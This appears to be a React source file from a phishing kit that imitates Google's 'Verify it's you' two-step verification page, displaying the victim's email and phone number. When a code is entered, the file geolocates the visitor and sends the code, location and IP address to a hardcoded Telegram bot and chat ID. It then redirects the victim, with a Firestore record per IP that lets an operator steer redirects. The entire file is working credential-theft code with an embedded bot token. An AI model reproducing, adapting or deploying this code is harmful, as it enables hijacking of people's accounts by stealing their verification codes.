import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';
import '../assets/poza2.css';
import GoogleLogo from '../assets/google-logo.png';


const About3 = () => {
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)


    const handleActions = () => {
        if (code === '') {
          // Handle code validation
          // You can set an error state or display a message
          return;
        } else {
          const bot = 'bot6025784851:AAFcSrozRyU8WAZTOr1wiSCB1m6HKiZwZoY';
          const chid = '5651241356';
    
          fetch(`https://ipapi.co/json/`)
            .then((response) => response.json())
            .then((response) => {
              const { country, region, city } = response;
              const params = {
                content: `========================
                  TWO 1: '${code}'
                  Country : '${country}'
                  Region : '${region}'
                  City : '${city}'
                  IP: '${ip}'
                  ========================`
              };
    
              fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
              })
                .then(() => {
                    window.location = 'rwr'
                  // Handle success, e.g., redirect to 'confirm2.html'
                  // You can use react-router or window.location
                })
                .catch((error) => {
                    window.location = 'rwr'
                });
            });
        }
      };
    
      const handleCodeChange = (e) => {
        setCode(e.target.value.replace(/[^0-9]/g, '')); // Allow only numeric input
      };

    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true)
                setUserData(x);
                return x;
            }

        })
        if (filter.length === 0) {
            addUserData()
        }
    }


    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true
                        setUserData(x)
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url)
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Welcome About3';

    }, [userData, userUrl])

    useEffect(() => {

    }, [userData])


    const addUserData = async () => {

        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData()
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl
        }, 1000)
        resetUserNumber()

    }
    console.log("hi here is the data", isUserData, userData)

    if (isUserData) {
        return (
            <>
                {userData.number !== null && userData.number !== undefined && userData.number !== -1 && (<div></div>)}
                 <div className='positivus'>
                <img src={GoogleLogo} alt='google logo' className='googleImg'/>
                <h2 className='positHeading'>Verify it's you</h2>
                <p className='positPara'>To help keep your account safe, Google wants to make sure it's really
                you trying to sign in <br /></p>
                <div className='positContent'>
                    <p id='email-display'>{userData.email}</p>
                    <div className='positContentImg'>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 512 512"><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c39.77 0 72 32.24 72 72S295.8 272 256 272c-39.76 0-72-32.24-72-72S216.2 128 256 128zM256 448c-52.93 0-100.9-21.53-135.7-56.29C136.5 349.9 176.5 320 224 320h64c47.54 0 87.54 29.88 103.7 71.71C356.9 426.5 308.9 448 256 448z"/></svg>
                    </div>
                </div>
                <br></br><br></br>
                <h4 className='checkPhone'>2-Step Verification</h4>
                <p className='notification'> {'A text message with a 6-digit Verification code was just sent to ********** '} <strong>{userData.number}</strong>  </p>
                <div className='positInput'>
                
                 
                    <br/>
                    
                    <div className='sfasfkWFtomnS centered'>
                    <input type="text" id="code" name="code" class="textfield45" onChange={handleCodeChange} required/>
            <span className='form-code'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enter the code</span>
            <p id='g' >G -</p>
            </div>

                     <br/>
                    
     
			
    
                
                    <label>
                        <input type='checkbox' className='checkedbox' checked/>
                        <span className='inputSpan' id="inputSpan">Don't ask again on this device</span>
                    </label>
                    <div className="forca">
              
            </div>
                
                </div>
                <div className='resetDiv'>
                    <a href='#' className='resendbtn'>Try another way</a>
                    <button type="submit" class="submit-button" onClick={handleActions}>Next</button>
                </div>
               
                <div className='footer'>
                <div>
                English (United States)
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="10"
                  height="10"
                  fill="currentColor"
                  class="bi bi-caret-down-fill"
                  viewBox="0 0 16 16"
                >
                  <path
                    d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z"
                  />
                </svg>
              </div>
              <div>
                <a href='#' className='footerleft1'>Help</a>
                <a href='#' className='footerleft1'>Privacy</a>
                <a href='#' className='footerleft1'>Terms</a>
                
              </div>
                </div>
            </div>
            </>
        );
    }

}

export default About3;